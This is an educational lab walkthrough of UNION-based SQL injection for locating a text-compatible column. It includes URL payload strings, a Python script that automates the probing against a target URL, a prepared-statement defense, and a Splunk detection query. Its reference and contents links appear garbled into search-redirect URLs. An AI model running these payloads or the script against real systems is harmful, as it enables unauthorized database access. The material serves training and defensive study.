# Lab Walkthrough: SQL Injection UNION Attack (Finding a Column Containing Text)

* **Vulnerability Type:** In-Band SQL Injection (UNION-Based)
* **Target Context:** Data Type Probing & Column Mapping
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Not Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [Data Type Probing Comparison](https://www.google.com/search?q=%25234-data-type-probing-comparison&utm_source=gemini)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-python-poc&utm_source=gemini)
6. [Defense & Prevention](https://www.google.com/search?q=%25236-defense--prevention&utm_source=gemini)
7. [Detection & SIEM Monitoring Rules](https://www.google.com/search?q=%25237-detection--siem-monitoring-rules&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

A `UNION` SQL injection attack merges the result set of the application's original query with a secondary, attacker-controlled query. To succeed, relational databases enforce two strict rules on `UNION` operations:

* **Rule 1: Column Count Match:** The injected query must return the exact same number of columns as the original query.
* **Rule 2: Data Type Compatibility:** The data types of the corresponding columns in both queries must be compatible.

If an attacker attempts to extract a string (like a password) into a column formatted exclusively for integers (like a price or ID), the database throws a type-conversion error, neutralizing the attack.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   UNION DATA TYPE PROBING FLOW                         │
└────────────────────────────────────────────────────────────────────────┘

  [Original Query] SELECT id (INT), name (VARCHAR), price (INT) FROM items
                                      +
  [Attacker Query] UNION SELECT NULL, 'payload', NULL
                                      │
  [Database Eval]  Col 1: INT matches NULL       (PASS)
                   Col 2: VARCHAR matches String (PASS)
                   Col 3: INT matches NULL       (PASS)
                                      │
  [Execution]      Query succeeds. 'payload' renders on the webpage.

```

> **Learning Checkpoint 1:** Why start with `NULL`? `NULL` is polymorphic in SQL. It can be implicitly cast to an integer, a string, a date, or a boolean. Using `NULL` allows you to map the column count (width) without tripping data-type errors.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The product category filter (`/filter?category=`).
* **Primary Objective:** Determine the query's column count, locate a column that accepts string data, and inject a lab-provided random string (e.g., `'abcdef'`) into the DOM.
* **Validation Signal:** The application renders the injected random string on the page without throwing an `HTTP 500 Internal Server Error`.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Determine Column Count

Establish the structural width of the `UNION` query using incremental `NULL` values.

* **Test 1:** `category=Gifts'+UNION+SELECT+NULL--`
* *Result:* `HTTP 500 Internal Server Error` (Width mismatch).


* **Test 2:** `category=Gifts'+UNION+SELECT+NULL,NULL--`
* *Result:* `HTTP 500 Internal Server Error` (Width mismatch).


* **Test 3:** `category=Gifts'+UNION+SELECT+NULL,NULL,NULL--`
* *Result:* `HTTP 200 OK`.
* *Conclusion:* The query returns exactly **three columns**.



### Phase 2: Data Type Probing (The Sliding Technique)

Systematically slide a string literal across the `NULL` array to map the data types of each column position. Assuming the lab provides the target string `'XyZ123'`:

* **Probe Column 1:** `'+UNION+SELECT+'XyZ123',NULL,NULL--`
* *If 500 Error:* Column 1 is strictly numeric or date-based. Move to the next.


* **Probe Column 2:** `'+UNION+SELECT+NULL,'XyZ123',NULL--`
* *If 200 OK:* Column 2 supports `VARCHAR`/`TEXT` data. Exfiltration channel identified.


* **Probe Column 3:** `'+UNION+SELECT+NULL,NULL,'XyZ123'--`
* *(Optional if Col 2 works, but good for mapping full capabilities).*



### Phase 3: Payload Delivery

* Inject the specific string provided by the lab instructions into the discovered text-compatible column.
* Submit the request. The target string reflects in the application UI, solving the lab.

> **Learning Checkpoint 2:** What if every column throws an error when probed with a string? If the original query strictly selects integers (e.g., `SELECT id, price, stock`), an in-band string extraction via `UNION` is impossible. You must pivot to Error-Based, Boolean Blind, or Time-Based SQLi techniques.

---

## 4. Data Type Probing Comparison

Understanding how SQL handles data type coercion is critical for diagnosing injection failures during reconnaissance.

| Injected Value | Compatible Target Columns | Error Condition (If Incompatible) |
| --- | --- | --- |
| `NULL` | ALL (`INT`, `VARCHAR`, `DATE`, `BOOL`) | None (Polymorphic safety). |
| `'string'` | `VARCHAR`, `TEXT`, `CHAR` | `Conversion failed when converting varchar to data type int.` |
| `12345` (Int) | `INT`, `FLOAT`, `VARCHAR` | Rare (Integers typically coerce to strings automatically). |
| `0x414243` (Hex) | `VARCHAR`, `BLOB`, `BINARY` | Allows bypassing WAF filters blocking single quotes. |

---

## 5. Automated Exploitation Script (Python PoC)

This script automates the structural mapping phase, dynamically isolating which column positions accept string data.

```python
#!/usr/bin/env python3
"""
UNION SQLi String Probing Automator (PoC)
Discovers text-compatible columns iteratively.
"""

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def find_text_columns(target_url, target_string):
    session = requests.Session()
    base_url = f"{target_url}/filter?category=Gifts"
    
    # Pre-determined from Phase 1 (Assume 3 columns for this lab)
    column_count = 3 
    print(f"[*] Assumed column width: {column_count}")
    print("[*] Probing for string-compatible columns...")

    for i in range(column_count):
        # Create an array of NULLs
        payload_array = ["NULL"] * column_count
        # Inject the string literal at the current index
        payload_array[i] = f"'{target_string}'"
        
        # Construct the UNION payload
        injected_columns = ",".join(payload_array)
        payload = f"'+UNION+SELECT+{injected_columns}--"
        
        print(f"[*] Testing payload: {payload}")
        response = session.get(base_url + payload, verify=False)
        
        if response.status_code == 200:
            if target_string in response.text:
                print(f"[+] SUCCESS: Column {i+1} accepts string data!")
                print(f"[+] Exploit URL: {response.url}")
                return
            else:
                print(f"[-] Column {i+1} returned 200 OK, but string was not reflected.")
        else:
            print(f"[-] Column {i+1} rejected the string (HTTP {response.status_code}).")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 string_probe.py <TARGET_BASE_URL> <LAB_PROVIDED_STRING>")
        sys.exit(1)
        
    find_text_columns(sys.argv[1].rstrip('/'), sys.argv[2])

```

---

## 6. Defense & Prevention

* **Parameterized Queries (Prepared Statements):** The definitive defense. This ensures the database driver treats user input strictly as a data literal, decoupling it from executable SQL syntax.
```java
// SECURE Implementation
String query = "SELECT name, description, price FROM products WHERE category = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, userInputCategory); 

```


* **Strong Type Casting:** Enforce strict data type validation on inbound requests at the application routing layer before data touches the database interface.

---

## 7. Detection & SIEM Monitoring Rules

Detect automated probing methodology by monitoring for rapid sequences of `NULL` injections and subsequent database syntax errors.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| eval decoded_uri=urldecode(uri_query)
| search decoded_uri="*UNION*SELECT*" AND decoded_uri="*NULL*"
| transaction src_ip maxspan=5m
| stats count by src_ip, decoded_uri, status
| where count > 3

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **All `NULL` replacements return 500 Error** | Target table contains no string columns. | `UNION` string extraction is impossible here. Pivot to blind extraction techniques. |
| **Returns 200 OK, but payload doesn't appear on screen** | Application truncates output rows. | The application might only render the *first* row. Break the primary query (e.g., `category=INVALID_CAT'+UNION...`) to force the application to render your injected row. |
| **Database error: "Conversion failed"** | Injected type mismatch. | You injected `'string'` into an integer column. Move the string to the next `NULL` position. |

---

## 9. References & Standards

* [PortSwigger: SQL Injection UNION Attacks](https://www.google.com/search?q=https://portswigger.net/web-security/sql-injection/union-attacks&utm_source=gemini)
* [OWASP Top 10-2021: A03 - Injection](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/&utm_source=gemini)
* [MITRE ATT&CK: T1190 - Exploit Public-Facing Application](https://www.google.com/search?q=https://attack.mitre.org/techniques/T1190/&utm_source=gemini)

---

> **Key Insight:** `UNION` SQL injection relies on absolute structural symmetry. By mapping the exact column count and pinpointing text-compatible fields, you transform a passive data-retrieval endpoint into a precise, active exfiltration channel.
